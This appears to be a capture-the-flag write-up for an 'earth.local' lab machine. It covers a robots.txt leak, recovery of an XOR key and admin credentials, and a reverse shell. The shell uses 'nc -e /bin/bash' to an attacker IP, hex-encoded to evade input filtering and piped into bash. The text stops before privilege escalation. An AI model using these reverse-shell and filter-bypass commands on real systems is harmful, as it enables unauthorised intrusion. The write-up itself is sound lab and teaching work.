| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space
| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
add earth.local and terratest.earth.local to hosts

inside earth.local, theres an encryption service.

explore a bit and you'll see that terratest.earth.local has robots.txt:
User-Agent: *
Disallow: /*.asp
Disallow: /*.aspx
Disallow: /*.bat
Disallow: /*.c
Disallow: /*.cfm
Disallow: /*.cgi
Disallow: /*.com
Disallow: /*.dll
Disallow: /*.exe
Disallow: /*.htm
Disallow: /*.html
Disallow: /*.inc
Disallow: /*.jhtml
Disallow: /*.jsa
Disallow: /*.json
Disallow: /*.jsp
Disallow: /*.log
Disallow: /*.mdb
Disallow: /*.nsf
Disallow: /*.php
Disallow: /*.phtml
Disallow: /*.pl
Disallow: /*.reg
Disallow: /*.sh
Disallow: /*.shtml
Disallow: /*.sql
Disallow: /*.txt
Disallow: /*.xml
Disallow: /testingnotes.*

the last line is definitely not sus :hmmm:
we go to testingnotes, since its a note, we assume that its testingnotes.txt, we get this:

Testing secure messaging system notes:
*Using XOR encryption as the algorithm, should be safe as used in RSA.
*Earth has confirmed they have received our sent messages.
*testdata.txt was used to test encryption.
*terra used as username for admin portal.
Todo:
*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
*Need to test different key lengths to protect against bruteforce. How long should the key be?
*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.

now we get another clue:
- encryption service is using XOR
- terra is the username for admin portal, we explore later
- testdata.txt

we go to testdata.txt, we got this:
According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.

now these texts might be 2 different things: a plain text that will be encrypted or the key itselves. When we test it, we get that its a key for the last ciphertext

we get a text:

earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat


we go to https://earth.local/admin to get to the admin page, we login with 
username: terra
password: earthclimatechangebad4humans 

we'll get a reverse shell there, first we listen to our machine at port 42069
nc -lvnp 42069
then we'll get a shell session on our target machine
because the input is filtering ip, we need to get some sort of encoding involved
this shell will be encoded to hexadecimal
nc -e /bin/bash 10.0.2.15 42069
6e63202d65202f62696e2f626173682031302e302e322e3135203432303639
input to the web cli:

echo 6e63202d65202f62696e2f626173682031302e302e322e3135203432303639 | xxd -r -p | bash

we get the shell, then we'll upgrade the shell with
python3 -c 'import pty;pty.spawn("/bin/bash")'

we now get the user privilege, now what we have to do is do some privilege escalation
